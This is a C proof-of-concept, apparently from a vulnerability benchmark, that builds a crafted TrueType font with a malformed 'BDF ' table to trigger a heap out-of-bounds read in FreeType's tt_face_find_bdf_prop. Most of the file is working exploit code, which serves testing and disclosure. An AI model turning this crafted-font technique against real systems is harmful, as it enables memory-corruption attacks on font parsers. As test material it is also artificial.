/*
 * PoC: out-of-bounds read in tt_face_find_bdf_prop (src/sfnt/ttbdf.c).
 *
 * Builds a minimal TrueType font that carries a crafted 'BDF ' table, then
 * queries a BDF property through the public API.  The property has an ATOM
 * value whose offset (`value`) is larger than its name offset.  The shipped
 * tree caps the terminator scan with `strings_size - name_offset`, which — for
 * a scan that starts at `strings + value` — overruns the strings buffer by
 * (value - name_offset) bytes when those bytes contain no 0.  AddressSanitizer
 * reports a heap-buffer-overflow read.
 *
 * On the golden tree the scan length is `strings_size - value`, which stays in
 * bounds, so nothing fires.
 *
 * Build:
 *   gcc -fsanitize=address -g -Iinclude pocs/residual.c \
 *       objs/.libs/libfreetype.a -lm -o /tmp/poc
 * Run:
 *   /tmp/poc
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <ft2build.h>
#include <freetype/freetype.h>
#include <freetype/ftbdf.h>


/* ---- big-endian helpers -------------------------------------------- */

static unsigned char  g_font[4096];
static unsigned long  g_size = 0;

static void
put16( unsigned long  off, unsigned int  v )
{
  g_font[off]     = (unsigned char)( ( v >> 8 ) & 0xFF );
  g_font[off + 1] = (unsigned char)( v & 0xFF );
}

static void
put32( unsigned long  off, unsigned long  v )
{
  g_font[off]     = (unsigned char)( ( v >> 24 ) & 0xFF );
  g_font[off + 1] = (unsigned char)( ( v >> 16 ) & 0xFF );
  g_font[off + 2] = (unsigned char)( ( v >> 8 ) & 0xFF );
  g_font[off + 3] = (unsigned char)( v & 0xFF );
}


/* ---- table blobs --------------------------------------------------- */

typedef struct
{
  const char*    tag;
  unsigned char  data[128];
  unsigned long  len;
  unsigned long  off;
} Table;


static void
build_font( void )
{
  Table  tabs[7];
  int    n = 0;

  /* 'BDF ' payload ------------------------------------------------- */
  {
    unsigned char*  b = tabs[n].data;
    unsigned long   strings_off = 22;
    unsigned long   strings_size = 32;
    unsigned long   i;

    /* header */
    b[0] = 0x00; b[1] = 0x01;              /* version   = 1          */
    b[2] = 0x00; b[3] = 0x01;              /* num_strikes = 1        */
    b[4] = 0; b[5] = 0; b[6] = 0; b[7] = 22;   /* strings offset = 22 */

    /* strike header: ppem = 16, count = 1 */
    b[8] = 0x00; b[9] = 0x10;              /* ppem  = 16             */
    b[10] = 0x00; b[11] = 0x01;            /* count = 1              */

    /* one property item (10 bytes) at offset 12 */
    b[12] = 0; b[13] = 0; b[14] = 0; b[15] = 0;   /* name_offset = 0  */
    b[16] = 0x00; b[17] = 0x10;                   /* type = 0x0010    */
    b[18] = 0; b[19] = 0; b[20] = 0; b[21] = 5;   /* value = 5        */

    /* strings region at offset 22, size 32 */
    b[strings_off + 0] = 'F';
    b[strings_off + 1] = 'O';
    b[strings_off + 2] = 'N';
    b[strings_off + 3] = 'T';
    b[strings_off + 4] = 0;                /* name terminator        */
    for ( i = 5; i < strings_size; i++ )
      b[strings_off + i] = 0xAA;           /* no 0 from value=5 on    */

    tabs[n].tag = "BDF ";
    tabs[n].len = strings_off + strings_size;   /* 54 */
    n++;
  }

  /* 'glyf' (empty) ------------------------------------------------- */
  tabs[n].tag = "glyf";
  tabs[n].len = 0;
  n++;

  /* 'head' --------------------------------------------------------- */
  {
    unsigned char*  b = tabs[n].data;

    memset( b, 0, 54 );
    b[0] = 0x00; b[1] = 0x01; b[2] = 0x00; b[3] = 0x00;  /* version 1.0 */
    /* magic number at offset 12 */
    b[12] = 0x5F; b[13] = 0x0F; b[14] = 0x3C; b[15] = 0xF5;
    /* unitsPerEm at offset 18 = 1000 */
    b[18] = 0x03; b[19] = 0xE8;
    /* indexToLocFormat at offset 50 = 0 (short) */
    b[50] = 0x00; b[51] = 0x00;
    /* glyphDataFormat at 52 = 0 */
    tabs[n].tag = "head";
    tabs[n].len = 54;
    n++;
  }

  /* 'hhea' --------------------------------------------------------- */
  {
    unsigned char*  b = tabs[n].data;

    memset( b, 0, 36 );
    b[0] = 0x00; b[1] = 0x01; b[2] = 0x00; b[3] = 0x00;  /* version 1.0 */
    b[4] = 0x03; b[5] = 0x20;              /* ascender  = 800        */
    b[6] = 0xFF; b[7] = 0x38;              /* descender = -200       */
    /* numberOfHMetrics at offset 34 = 1 */
    b[34] = 0x00; b[35] = 0x01;
    tabs[n].tag = "hhea";
    tabs[n].len = 36;
    n++;
  }

  /* 'hmtx' --------------------------------------------------------- */
  {
    unsigned char*  b = tabs[n].data;

    b[0] = 0x01; b[1] = 0xF4;              /* advanceWidth = 500     */
    b[2] = 0x00; b[3] = 0x00;              /* lsb = 0                */
    tabs[n].tag = "hmtx";
    tabs[n].len = 4;
    n++;
  }

  /* 'loca' (short, 2 entries) ------------------------------------- */
  {
    unsigned char*  b = tabs[n].data;

    b[0] = 0; b[1] = 0;                    /* glyph 0 offset = 0     */
    b[2] = 0; b[3] = 0;                    /* end          = 0       */
    tabs[n].tag = "loca";
    tabs[n].len = 4;
    n++;
  }

  /* 'maxp' --------------------------------------------------------- */
  {
    unsigned char*  b = tabs[n].data;

    memset( b, 0, 32 );
    b[0] = 0x00; b[1] = 0x01; b[2] = 0x00; b[3] = 0x00;  /* version 1.0 */
    b[4] = 0x00; b[5] = 0x01;              /* numGlyphs = 1          */
    b[14] = 0x00; b[15] = 0x01;            /* maxZones  = 1          */
    tabs[n].tag = "maxp";
    tabs[n].len = 32;
    n++;
  }

  /* ---- assemble ----------------------------------------------- */
  {
    unsigned long  num_tables = (unsigned long)n;
    unsigned long  dir_size   = 12 + num_tables * 16;
    unsigned long  off        = dir_size;
    int            i;

    /* header */
    put32( 0, 0x00010000UL );              /* sfnt version           */
    put16( 4, (unsigned int)num_tables );
    put16( 6, 64 );                        /* searchRange            */
    put16( 8, 2 );                         /* entrySelector          */
    put16( 10, (unsigned int)( num_tables * 16 - 64 ) );  /* rangeShift */

    for ( i = 0; i < n; i++ )
    {
      tabs[i].off = off;
      memcpy( g_font + off, tabs[i].data, tabs[i].len );
      off += tabs[i].len;
      while ( off & 3 )                    /* 4-byte align           */
        g_font[off++] = 0;
    }

    /* directory entries (tags already in ascending order) */
    for ( i = 0; i < n; i++ )
    {
      unsigned long  e = 12 + (unsigned long)i * 16;

      memcpy( g_font + e, tabs[i].tag, 4 );
      put32( e + 4, 0 );                   /* checkSum (unverified)  */
      put32( e + 8, tabs[i].off );
      put32( e + 12, tabs[i].len );
    }

    g_size = off;
  }
}


/* ---- custom stream with a read callback (forces frame alloc) ------- */

static unsigned long
stream_read( FT_Stream       stream,
             unsigned long   offset,
             unsigned char*  buffer,
             unsigned long   count )
{
  if ( offset > g_size )
    return 0;
  if ( count == 0 )
    return 0;
  if ( offset + count > g_size )
    count = g_size - offset;
  memcpy( buffer, g_font + offset, count );
  return count;
}

static void
stream_close( FT_Stream  stream )
{
  (void)stream;
}


int
main( void )
{
  FT_Library      library;
  FT_Face         face = NULL;
  FT_StreamRec    stream;
  FT_Open_Args    args;
  BDF_PropertyRec prop;
  FT_Error        err;


  build_font();

  if ( FT_Init_FreeType( &library ) )
  {
    fprintf( stderr, "init failed\n" );
    return 2;
  }

  memset( &stream, 0, sizeof( stream ) );
  stream.base               = NULL;
  stream.size               = g_size;
  stream.pos                = 0;
  stream.descriptor.pointer = g_font;
  stream.read               = stream_read;
  stream.close              = stream_close;

  memset( &args, 0, sizeof( args ) );
  args.flags  = FT_OPEN_STREAM;
  args.stream = &stream;

  err = FT_Open_Face( library, &args, 0, &face );
  if ( err )
  {
    fprintf( stderr, "FT_Open_Face failed: 0x%02x\n", err );
    return 2;
  }

  if ( FT_Set_Pixel_Sizes( face, 0, 16 ) )
  {
    fprintf( stderr, "set pixel size failed\n" );
    return 2;
  }

  /* triggers tt_face_find_bdf_prop -> ft_memchr OOB read on shipped tree */
  err = FT_Get_BDF_Property( face, "FONT", &prop );
  fprintf( stderr, "FT_Get_BDF_Property returned 0x%02x type %d\n",
           err, (int)prop.type );

  FT_Done_Face( face );
  FT_Done_FreeType( library );
  return 0;
}
